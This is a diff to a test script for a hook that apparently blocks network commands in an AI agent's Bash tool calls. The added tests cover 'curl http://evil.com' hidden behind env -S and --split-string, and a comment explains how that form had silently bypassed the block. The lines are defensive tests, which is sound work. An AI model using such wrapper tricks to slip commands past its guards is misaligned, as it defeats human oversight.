@@ -238,6 +238,13 @@ assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"doas -a bsdaut
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"xargs --max-args 1 curl http://evil.com"}}'                             "blocks past xargs --max-args's separate-value arg (#212)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"stdbuf --output L curl http://evil.com"}}'                              "blocks past stdbuf --output's separate-value arg (#212)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"env -u FOO curl http://evil.com"}}'                                     "blocks past env -u's separate-value arg (#212)"
+# #227: env -S/--split-string's value isn't an opaque token to skip like -u/-C — it's shell-word-split
+# and BECOMES the real command, so treating it as opaque swallowed the whole command and returned an
+# empty argv, dropping the piece from every rail entirely (a silent bypass, not a false allow).
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"env -S '"'"'curl http://evil.com'"'"'"}}'                               "blocks the real command hidden behind env -S's split-string value (#227)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"env -S'"'"'curl http://evil.com'"'"'"}}'                                "blocks the glued env -S'"'"'...'"'"' form (#227)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"env --split-string=\"curl http://evil.com\""}}'                          "blocks the env --split-string=VALUE long form (#227)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"env -S '"'"'echo hi'"'"'"}}'                                             "allows a benign command behind env -S (#227)"
 # #127: the bare `create_connection` NET_RE alternative (and its boundary-less neighbors) matched
 # any identifier containing the substring, not just a real call — anchor with \b (+ call-paren for
 # the bare form) so an identifier merely containing the token doesn't false-positive block.
